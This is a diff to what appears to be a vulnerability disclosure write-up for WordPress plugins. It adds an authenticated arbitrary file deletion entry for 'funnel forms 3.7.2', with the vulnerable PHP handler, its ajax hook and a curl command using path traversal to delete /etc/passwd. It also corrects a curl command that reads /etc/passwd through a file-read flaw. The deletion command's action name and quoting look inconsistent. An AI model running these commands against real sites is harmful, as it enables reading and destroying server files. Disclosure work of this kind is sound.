@@ -2726,11 +2726,11 @@ public function ajax_get_file(){
 - Exploiting it-:A request will be made to `/wp-admin/admin-ajax.php?action=get_file
 
 ```bash
-curl '<WORDPRESS_BASE_URL/wp-admin/admin-ajax.php?action=get_file&url=/etc/passwd' -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
+curl '<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=get_file&url=/etc/passwd' -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
 ```
 ------------
 
-### Arbitrary file deletion in funnel forms 3.7.2
+### Authenticated Arbitrary file deletion in funnel forms 3.7.2
 
 -------------
 
@@ -2751,8 +2751,35 @@ curl '<WORDPRESS_BASE_URL/wp-admin/admin-ajax.php?action=get_file&url=/etc/passw
 	        }
 	    }
 ```
+- Parameter that gets deleted
 
+```php
+          public function af2_delete_font() {
+	        if ( !current_user_can( 'edit_others_posts' ) ) {
+	            die( 'Permission denied' );
+	        }
+	        if ( ! isset( $_POST['nonce'] ) || ! wp_verify_nonce( $_POST['nonce'], 'af2_FE_nonce' ) ) {
+	            die( 'Permission denied' );
+	        }
+	        $deleted = $this->af2DeleteFontFile($_POST['deletefile']);
+	        if ($deleted) {
+	            echo 'Datei erfolgreich gelöscht.';
+	        } else {
+	            echo 'Fehler beim Löschen der Datei oder Datei nicht gefunden.';
+	        }
+	        wp_die();
+	    }
+```
+- Wp_action-:
 
+```php
+add_action( 'wp_ajax_af2_fnsf_delete_af2_font', array($this->Fnsf_Af2AjaxFormularbuilderFonts, 'af2_delete_font') );
+```
+- Exploitation-:
+
+```bash
+curl '<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=af2_delete_font -d "deletefile=../../../../etc/passwd&nonce=[nonce]" -H "Cookie:<cookie>"
+```
 
 
 
